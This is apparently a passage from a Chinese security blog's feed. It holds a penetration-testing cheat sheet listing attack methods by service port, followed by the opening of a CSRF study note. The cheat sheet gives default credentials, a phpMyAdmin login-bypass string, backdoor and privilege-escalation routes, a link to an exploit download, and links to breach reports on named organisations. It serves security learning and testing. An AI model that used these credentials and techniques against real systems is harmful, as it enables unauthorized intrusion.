<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0162704" target="_blank" rel="noopener">大量惠普打印机远程telnet可被查看和操作</a></p>
<h5 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h5><p>​    远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<p>默认端口：3389</p>
<p>攻击方式：</p>
<p>爆破：3389端口爆破工具就有点多了</p>
<p>Shift粘滞键后门：5次shift后门</p>
<p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；</p>
<h5 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h5><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
<p>默认端口：5900+桌面ID（5901；5902）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>认证口令绕过：</p>
<p>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014" target="_blank" rel="noopener">CVE-2015-5239</a>）</p>
<p>权限提升：（CVE-2013-6886）</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0143044" target="_blank" rel="noopener">广西电信客服服务器使用VNC存在弱口令可直接控制</a></p>
<h5 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h5><p>​        PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<p>默认端口：5632</p>
<p>攻击方式：</p>
<p>提权控制服务：</p>
<p>拒绝服务攻击：</p>
<p>代码执行：<a href="https://www.seebug.org/vuldb/ssvid-30050" target="_blank" rel="noopener">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-034519/" target="_blank" rel="noopener">黑龙江物价局多处安全漏洞可能导致服务器沦陷(pcAnywhere提权+密码突破)</a></p>
<h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><p>​    HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h5 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h5><p>默认端口：80/81/443</p>
<p>攻击方式：</p>
<p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p>
<p>短文件名泄漏：这种一般没啥影响</p>
<p>解析漏洞：详细见apache服务</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-047134" target="_blank" rel="noopener">徐州市教育系统大量IIS PUT漏洞</a></p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=27365" target="_blank" rel="noopener">用友软件IIS写权限(PUT)导致可获取webshell控制服务器</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093865" target="_blank" rel="noopener">国家电网某分站存在iis短文件名漏洞</a></p>
<h5 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h5><p>默认端口：80/8080</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破manager后台）</p>
<p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p>
<p>解析漏洞：<a href="http://drops.wooyun.org/papers/539" target="_blank" rel="noopener">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-018433" target="_blank" rel="noopener">安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-06947" target="_blank" rel="noopener">腾讯分站 Apache 漏洞</a></p>
<h5 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h5><p>默认端口：7001</p>
<p>攻击方式：</p>
<p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p>
<p>Congsole后台部署webshell：</p>
<p>Java反序列化：</p>
<p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p>
<p>SSRF窥探内网：<a href="http://www.wooyun.org/bugs/wooyun-2015-0136698" target="_blank" rel="noopener">央视网SSRF可窥探内网</a></p>
<p>案列分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-038214" target="_blank" rel="noopener">福建省人力资源和社会保障厅下属某WEBLOGIC弱口令</a></p>
<p><a href="http://drops.wooyun.org/tips/8321" target="_blank" rel="noopener">利用Weblogic进行入侵的一些总结</a></p>
<h5 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h5><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破jboss系统后台）</p>
<p>远程代码执行：<a href="http://www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html" target="_blank" rel="noopener">由于配置不当造成</a></p>
<p>Java反序列化：</p>
<p>案例分享</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-07409" target="_blank" rel="noopener">中华人民共和国民政部JBoss配置不当</a></p>
<p><a href="http://drops.wooyun.org/papers/178" target="_blank" rel="noopener">JBOSS安全问题总结</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0110279" target="_blank" rel="noopener">中国科学院某处jboss应用漏洞</a></p>
<h5 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h5><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p>
<p>攻击方式：</p>
<p>爆破：弱口令（控制台）</p>
<p>任意文件泄漏：（CVE-2014-0823）</p>
<p>Java反序列化</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-036803" target="_blank" rel="noopener">中国电信某通用型业务系统(Websphere)GetShell漏洞</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0167244" target="_blank" rel="noopener">大汉网络有限公司远程命令执行漏洞(WebSphere案例)</a></p>
<h5 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h5><p>默认端口：http 8080；IIOP 3700；控制台4848</p>
<p>攻击方式：</p>
<p>爆破：弱口令（对于控制台）</p>
<p>任意文件读取：</p>
<p>认证绕过：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595/" target="_blank" rel="noopener">应用服务器glassfish存在通用任意文件读取漏洞</a></p>
<p><a href="http://www.tuicool.com/articles/ZRJriy" target="_blank" rel="noopener">Oracle GlassFish Server认证绕过</a></p>
<h5 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h5><p>默认端口：8080、8089</p>
<p>攻击方式：</p>
<p>爆破：弱口令（默认管理员）</p>
<p>未授权访问：</p>
<p>反序列化：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-062541" target="_blank" rel="noopener">酷6Jenkins系统未授权访问可执行系统命令</a></p>
<h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><p>默认端口：8080</p>
<p>攻击方式：</p>
<p>目录遍历</p>
<p>远程文件读取</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-017200" target="_blank" rel="noopener">爱奇艺Resin配置漏洞</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0126353" target="_blank" rel="noopener">Resin漏洞利用案例之目录遍历/以金蝶某系统为例</a></p>
<h5 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h5><p> 默认端口：8080</p>
<p> 攻击方式：</p>
<p>远程共享缓冲区溢出</p>
<h5 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h5><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<p>默认端口：1352</p>
<p>攻击方式：</p>
<p>爆破：弱口令（admin password）控制台</p>
<p>信息泄露</p>
<p>跨站脚本攻击</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-053881" target="_blank" rel="noopener">Lotus Domino WebMail一处越权访问</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134024" target="_blank" rel="noopener">中电投集团某系统弱口令直达内网涉及/OA系统/内部邮箱/财务系统/人力资源系统</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0109008" target="_blank" rel="noopener">中国某大型金融机构地方业务弱口令导致数万商户信息泄露&amp;访问Lotus Domino后台</a></p>
<h4 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h4><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
<h5 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h5><p>默认端口：3306</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">CVE-2012-2122</a></p>
<p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p>
<p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</p>
<p>案例分享：</p>
<p><a href="https://www.seebug.org/appdir/MySQL" target="_blank" rel="noopener">漏洞分享</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0115534/" target="_blank" rel="noopener">和讯网某站点存在mysql注入漏洞</a></p>
<p><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">MySQL提权总结</a></p>
<h5 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h5><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<p>攻击方式：</p>
<p>爆破：弱口令/使用系统用户</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/1620" target="_blank" rel="noopener">MSSQL注射总结</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102404" target="_blank" rel="noopener">上海安脉综合管理系统mssql注射漏洞</a></p>
<p><a href="http://drops.wooyun.org/tips/1067" target="_blank" rel="noopener">解密MSSQL连接数据库密码</a></p>
<p><a href="http://www.freebuf.com/articles/database/22997.html" target="_blank" rel="noopener">从攻击MSSQL到提权</a>: 使用msf针对mssql的一次完整渗透</p>
<h5 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h5><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>注入攻击；</p>
<p>漏洞攻击；</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/papers/6035" target="_blank" rel="noopener">Oracle盲注结合XXE漏洞远程获取数据</a></p>
<h5 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h5><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275" target="_blank" rel="noopener">浅谈postgresql数据库攻击技术</a> 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<p>默认端口：5432</p>
<p>攻击方式：</p>
<p>爆破：弱口令：postgres postgres</p>
<p>缓冲区溢出：CVE-2014-2669</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/6449" target="_blank" rel="noopener">Hacking postgresql</a></p>
<p><a href="http://zone.wooyun.org/content/4971" target="_blank" rel="noopener">关于postgresql的那些事</a></p>
<h5 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h5><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：<a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">请参考</a></p>
<p>默认端口：27017</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py" target="_blank" rel="noopener">请点击</a></p>
<p>案例分享：</p>
<p><a href="http://bobao.360.cn/learning/detail/274.html" target="_blank" rel="noopener">MongoDB phpMoAdmin远程代码执行</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-047153" target="_blank" rel="noopener">搜狐MongoDB未授权访问</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-066883" target="_blank" rel="noopener">新浪微米未授权访问</a></p>
<p><a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">解决MongoDB各种隐患问题</a></p>
<h5 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h5><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547</p>
<p>默认端口：6379</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问+配合ssh key提权；</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0152710/" target="_blank" rel="noopener">中国铁建网redis+ssh-keygen免认证登录</a></p>
<h5 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h5><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>命令注入：</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-083132" target="_blank" rel="noopener">广西自考信息系统Sybase数据库注入</a></p>
<p><a href="http://www.venustech.com.cn/NewsInfo/124/22061.Html" target="_blank" rel="noopener">Sybase EAServer命令注入漏洞</a></p>
<h5 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h5><p>默认端口：5000</p>
<p>攻击方式：</p>
<p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0113071" target="_blank" rel="noopener">哈尔滨银行主站DB2注入</a></p>
<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
<h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h5 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h5><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<p>默认端口：25（smtp）、465（smtps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>未授权访问</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-025810" target="_blank" rel="noopener">腾讯邮箱smtp注册时间限制绕过漏洞</a></p>
<p><a href="http://drops.wooyun.org/papers/534" target="_blank" rel="noopener">邮件伪造详解</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-03388" target="_blank" rel="noopener">qq邮箱伪造发件地址，容易被钓鱼利用</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-098813" target="_blank" rel="noopener">众多厂商邮件系统配置不当可伪造邮件人</a></p>
<h5 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h5><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<p>爆破；弱口令</p>
<p>未授权访问；</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bug.php?action=view&id=147087" target="_blank" rel="noopener">中国联通沃邮箱等部分Android客户端免密码登陆（可获取任意联通用户pop3密码）</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-094877" target="_blank" rel="noopener">中航信邮箱密码泄漏及VPN账号和大量邮箱弱口令导致可内网漫游拿到域控</a></p>
<h5 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h5><p>默认端口：143（imap）、993（imaps）</p>
<p>攻击方式：</p>
<p>爆破：弱口令</p>
<p>配置不当</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-022037" target="_blank" rel="noopener">163邮箱二次验证饶过缺陷</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-045426" target="_blank" rel="noopener">南方周末邮件服务器任意文件读取漏洞</a></p>
<h4 id="网络常见协议端口渗透"><a href="#网络常见协议端口渗透" class="headerlink" title="网络常见协议端口渗透"></a>网络常见协议端口渗透</h4><h5 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h5><p>默认端口：53</p>
<p>攻击方式：</p>
<p>区域传输漏洞</p>
<p>见2中的总结</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-061403" target="_blank" rel="noopener">全球Top1000Websites中存在DNS区域传送漏洞的网站列表</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0132048" target="_blank" rel="noopener">团购王某站DNS域传送漏洞</a></p>
<p><a href="http://drops.wooyun.org/tips/1354" target="_blank" rel="noopener">DNS泛解析与内容投毒</a></p>
<h5 id="DHCP服务"><a href="#DHCP服务" class="headerlink" title="DHCP服务"></a>DHCP服务</h5><p>默认端口：67&amp;68、546（DHCP Failover做双机热备的）</p>
<p>攻击方式：</p>
<p>DHCP劫持；</p>
<p>见2中总结</p>
<p>案例分享：</p>
<p><a href="http://www.freebuf.com/articles/network/74995.html" target="_blank" rel="noopener">流氓DHCP服务器内网攻击测试</a></p>
<h5 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h5><p>默认端口：161</p>
<p>攻击方式:</p>
<p>爆破：弱口令</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/409" target="_blank" rel="noopener">snmp弱口令引起的信息泄漏</a></p>
<p><a href="http://drops.wooyun.org/tips/2106" target="_blank" rel="noopener">基于snmp的反射攻击的理论及其实现</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-081037" target="_blank" rel="noopener">华为某服务器SNMP弱口令</a></p>
<h4 id="其他端口渗透"><a href="#其他端口渗透" class="headerlink" title="其他端口渗透"></a>其他端口渗透</h4><h5 id="Hadoop文件服务"><a href="#Hadoop文件服务" class="headerlink" title="Hadoop文件服务"></a>Hadoop文件服务</h5><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="noopener">请参考</a></p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-020282" target="_blank" rel="noopener">Apache Hadoop远程命令执行</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-022434" target="_blank" rel="noopener">新浪漏洞系列第六弹–大量hadoop应用对外访问</a></p>
<h5 id="Zookeeper服务"><a href="#Zookeeper服务" class="headerlink" title="Zookeeper服务"></a>Zookeeper服务</h5><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<p>默认端口：2181</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>案例分享：</p>
<p><a href="http://tangscan.com/plugin/17261" target="_blank" rel="noopener">zookeeper未授权访问漏洞</a></p>
<p>网上关于这方面的案例暂时不多，但是对于大数据逐渐泛滥的今天，这些漏洞未来会在乌云上出现一大波！</p>
<h5 id="Zabbix服务"><a href="#Zabbix服务" class="headerlink" title="Zabbix服务"></a>Zabbix服务</h5><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<p>默认端口：8069</p>
<p>攻击方式：</p>
<p>远程命令执行：</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/68" target="_blank" rel="noopener">当渗透遇到zabbix–小谈zabbix安全</a></p>
<p><a href="http://www.secpulse.com/archives/2089.html" target="_blank" rel="noopener">Zabbix的前台SQL注射漏洞利用</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2013-025219" target="_blank" rel="noopener">网易zabbix运维不当，导致任意命令执行。(可提权、可内网渗透)</a></p>
<h5 id="elasticsearch服务"><a href="#elasticsearch服务" class="headerlink" title="elasticsearch服务"></a>elasticsearch服务</h5><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<p>默认端口：9200（）、9300（）</p>
<p>攻击方式：</p>
<p>未授权访问；</p>
<p>远程命令执行；</p>
<p>文件遍历；</p>
<p>低版本webshell植入；</p>
<p>案例分享：</p>
<p><a href="http://www.secpulse.com/archives/5401.html" target="_blank" rel="noopener">ElasticSearch 远程代码执行漏洞</a></p>
<p><a href="http://www.freebuf.com/tools/38025.html" target="_blank" rel="noopener">elasticsearch 漏洞利用工具</a></p>
<h5 id="memcache服务"><a href="#memcache服务" class="headerlink" title="memcache服务"></a>memcache服务</h5><p>默认端口：11211</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/papers/865" target="_blank" rel="noopener">Memcache安全配置</a></p>
<p><a href="https://help.aliyun.com/knowledge_detail/6936805.html" target="_blank" rel="noopener">memcache 未授权访问漏洞</a></p>
<h5 id="Linux-R服务"><a href="#Linux-R服务" class="headerlink" title="Linux R服务"></a>Linux R服务</h5><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th><strong>攻击技巧</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>21/22/69</strong></td>
<td><strong>ftp/tftp</strong> <strong>：文件传输协议</strong></td>
<td><strong>爆破</strong> <strong>嗅探</strong> <strong>溢出；后门</strong></td>
</tr>
<tr>
<td><strong>22</strong></td>
<td><strong>ssh</strong> <strong>：远程连接</strong></td>
<td><strong>爆破</strong> <strong>OpenSSH</strong> <strong>；28个退格</strong></td>
</tr>
<tr>
<td><strong>23</strong></td>
<td><strong>telnet</strong>  <strong>：远程连接</strong></td>
<td><strong>爆破</strong> <strong>嗅探</strong></td>
</tr>
<tr>
<td><strong>25</strong></td>
<td><strong>smtp</strong> <strong>：邮件服务</strong></td>
<td><strong>邮件伪造</strong></td>
</tr>
<tr>
<td><strong>53</strong></td>
<td><strong>DNS</strong> <strong>：域名系统</strong></td>
<td><strong>DNS区域传输</strong> <strong>0.00DNS劫持DNS缓存投毒DNS欺骗深度利用：利用DNS隧道技术刺透防火墙</strong></td>
</tr>
<tr>
<td><strong>67/68</strong></td>
<td><strong>dhcp</strong></td>
<td><strong>劫持</strong> <strong>欺骗</strong></td>
</tr>
<tr>
<td><strong>110</strong></td>
<td><strong>pop3</strong></td>
<td><strong>爆破</strong></td>
</tr>
<tr>
<td><strong>139</strong></td>
<td><strong>samba</strong></td>
<td><strong>爆破</strong>     <strong>未授权访问  远程代码执行</strong></td>
</tr>
<tr>
<td><strong>143</strong></td>
<td><strong>imap</strong></td>
<td><strong>爆破</strong></td>
</tr>
<tr>
<td><strong>161</strong></td>
<td><strong>snmp</strong></td>
<td><strong>爆破</strong></td>
</tr>
<tr>
<td><strong>389</strong></td>
<td><strong>ldap</strong></td>
<td><strong>注入攻击</strong> <strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>512/513/514</strong></td>
<td><strong>linux r</strong></td>
<td><strong>直接使用</strong> <strong>rlogin</strong></td>
</tr>
<tr>
<td><strong>873</strong></td>
<td><strong>rsync</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>1080</strong></td>
<td><strong>socket</strong></td>
<td><strong>爆破：进行内网渗透</strong></td>
</tr>
<tr>
<td><strong>1352</strong></td>
<td><strong>lotus</strong></td>
<td><strong>爆破：弱口令</strong> <strong>信息泄漏：源代码</strong></td>
</tr>
<tr>
<td><strong>1433</strong></td>
<td><strong>mssql</strong></td>
<td><strong>爆破：使用系统用户登录</strong> <strong>注入攻击</strong></td>
</tr>
<tr>
<td><strong>1521</strong></td>
<td><strong>oracle</strong></td>
<td><strong>爆破：</strong> <strong>TNS</strong>  <strong>注入攻击</strong></td>
</tr>
<tr>
<td><strong>2049</strong></td>
<td><strong>nfs</strong></td>
<td><strong>配置不当</strong></td>
</tr>
<tr>
<td><strong>2181</strong></td>
<td><strong>zookeeper</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>3306</strong></td>
<td><strong>mysql</strong></td>
<td><strong>爆破</strong> <strong>拒绝服务</strong> <strong>注入</strong></td>
</tr>
<tr>
<td><strong>3389</strong></td>
<td><strong>rdp</strong></td>
<td><strong>爆破</strong> <strong>Shift</strong> <strong>后门</strong></td>
</tr>
<tr>
<td><strong>4848</strong></td>
<td><strong>glassfish</strong></td>
<td><strong>爆破：控制台弱口令</strong> <strong>认证绕过</strong></td>
</tr>
<tr>
<td><strong>5000</strong></td>
<td><strong>sybase/DB2</strong></td>
<td><strong>爆破</strong> <strong>注入</strong></td>
</tr>
<tr>
<td><strong>5432</strong></td>
<td><strong>postgresql</strong></td>
<td><strong>缓冲区溢出</strong> <strong>注入攻击</strong> <strong>爆破：弱口令</strong></td>
</tr>
<tr>
<td><strong>5632</strong></td>
<td><strong>pcanywhere</strong></td>
<td><strong>拒绝服务</strong> <strong>代码执行</strong></td>
</tr>
<tr>
<td><strong>5900</strong></td>
<td><strong>vnc</strong></td>
<td><strong>爆破：弱口令</strong> <strong>认证绕过</strong></td>
</tr>
<tr>
<td><strong>6379</strong></td>
<td><strong>redis</strong></td>
<td><strong>未授权访问</strong> <strong>爆破：弱口令</strong></td>
</tr>
<tr>
<td><strong>7001</strong></td>
<td><strong>weblogic</strong></td>
<td><strong>Java</strong> <strong>反序列化</strong> <strong>控制台弱口令</strong> <strong>控制台部署</strong> <strong>webshell</strong></td>
</tr>
<tr>
<td><strong>80/443/8080</strong></td>
<td><strong>web</strong></td>
<td><strong>常见</strong> <strong>web</strong> <strong>攻击</strong> <strong>控制台爆破</strong> <strong>对应服务器版本漏洞</strong></td>
</tr>
<tr>
<td><strong>8069</strong></td>
<td><strong>zabbix</strong></td>
<td><strong>远程命令执行</strong></td>
</tr>
<tr>
<td><strong>9090</strong></td>
<td><strong>websphere</strong> <strong>控制台</strong></td>
<td><strong>爆破：控制台弱口令</strong> <strong>Java</strong> <strong>反序列</strong></td>
</tr>
<tr>
<td><strong>9200/9300</strong></td>
<td><strong>elasticsearch</strong></td>
<td><strong>远程代码执行</strong></td>
</tr>
<tr>
<td><strong>11211</strong></td>
<td><strong>memcacache</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>27017</strong></td>
<td><strong>mongodb</strong></td>
<td><strong>爆破</strong> <strong>未授权访问</strong></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
  </entry>
  <entry>
    <title>CSRF漏洞学习</title>
    <url>/2020/04/03/csrf-lou-dong-xue-xi/</url>
    <content><![CDATA[<h2 id="CSRF漏洞笔记-靶场实战"><a href="#CSRF漏洞笔记-靶场实战" class="headerlink" title="CSRF漏洞笔记+靶场实战"></a>CSRF漏洞笔记+靶场实战</h2><h3 id="CSRF漏洞部分"><a href="#CSRF漏洞部分" class="headerlink" title="CSRF漏洞部分"></a>CSRF漏洞部分</h3><h4 id="CSRF简述"><a href="#CSRF简述" class="headerlink" title="CSRF简述"></a>CSRF简述</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​    CSRF攻击建立在浏览器和Web服务器的对话之中，并且能欺骗用户访问url，发起的目标是通过伪造的用户请求，该请求不是用户想发出去的请求，对服务器或服务来说，该请求是完全合法的请求，但却完成了攻击者的期望操作。</p>
<p>​    从代码上看，CSRF能攻击成功是攻击者猜到了你重要参数，因而伪造请求。</p>
<p>​    可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户</p>
<p><strong>浏览器Cookie机制：</strong></p>
<p>cookie的两种表现形式：一种是本地Cookie，又称持久性Cookie；</p>
<p>　　　　　　　　　　  一种是临时Cookie，又称Session Cookie；：</p>
